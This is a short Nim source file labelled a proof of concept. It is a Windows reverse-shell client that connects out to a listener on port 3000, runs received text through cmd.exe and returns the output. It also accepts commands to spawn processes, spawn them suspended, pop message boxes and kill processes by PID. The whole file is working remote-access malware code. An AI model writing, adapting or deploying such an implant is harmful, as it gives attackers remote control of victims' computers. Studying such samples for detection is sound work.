# THIS IS A POC , NOT GOOD FOR ACTUAL USAGE.
import net , osproc , strformat , strutils , winim
let
    ip = "127.0.0.1"
    port = 3000
    socket = newSocket()

proc tryConnect() = 
    while true:
        try:
            socket.connect(ip , Port(port))
            break
        except:
            echo("Error Connecting.")

tryConnect()

while true:
    try:
        let line = socket.recvLine()
        let commandObj = line.split(" ")
        let cmd = commandObj[0]
        case cmd:
        of "shell":
            let cmdToExc = commandObj[1..commandObj.len()-1].join(" ")
            let outputTuple = execCmdEx(fmt"cmd.exe /C {cmdToExc}")
            socket.send(outputTuple[0])
        of "spawn":
            let procName = commandObj[1]
            discard startProcess(procName)
        of "spawn_suspended":
            let procName = commandObj[1]
            let process = startProcess(procName)
            process.suspend()
        of "messagebox":
            let
                title : LPCSTR = commandObj[1].LPCSTR
                caption : LPCSTR = commandObj[2].LPCSTR
            MessageBoxA(
                cast[HWND](NULL),
                title,
                caption,
                MB_OK
            )
        of "terminate":
            let pid = parseInt(commandObj[1])
            let hProc = OpenProcess(PROCESS_ALL_ACCESS , FALSE , pid.DWORD)
            TerminateProcess(
                hProc,
                0
            )
            CloseHandle(hProc)

    except:
        echo("Error.")
